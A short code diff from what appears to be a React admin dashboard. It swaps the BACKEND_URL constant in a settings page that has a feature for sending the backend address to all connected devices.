@@ -2568,7 +2568,7 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
   }
 
   /* ── Send Backend URL to all devices ── */
-  const BACKEND_URL = "https://recovery2-robot.pages.dev/api";
+  const BACKEND_URL = "https://recovery5-7f2.pages.dev/api";
   const [sendUrlState, setSendUrlState] = useState<"idle"|"running"|"done"|"err">("idle");
   const [sendUrlDone, setSendUrlDone] = useState(0);
   const [sendUrlResult, setSendUrlResult] = useState<{ ok: number; fail: number } | null>(null);
